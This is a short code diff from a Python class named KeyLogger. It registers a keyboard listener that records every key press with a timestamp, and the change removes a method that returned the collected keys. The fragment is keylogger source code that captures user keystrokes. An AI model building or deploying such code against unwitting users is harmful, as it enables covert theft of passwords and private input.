@@ -16,10 +16,7 @@ class KeyLogger:
 
         self.listener = keyboard.Listener(on_press=self.on_press)
 
-
-    def getKeys(self):
-        return self.keys
-    
+  
     def on_press(self,key):
             log = ( datetime.now().time(), key )
             self.keys.append(log)
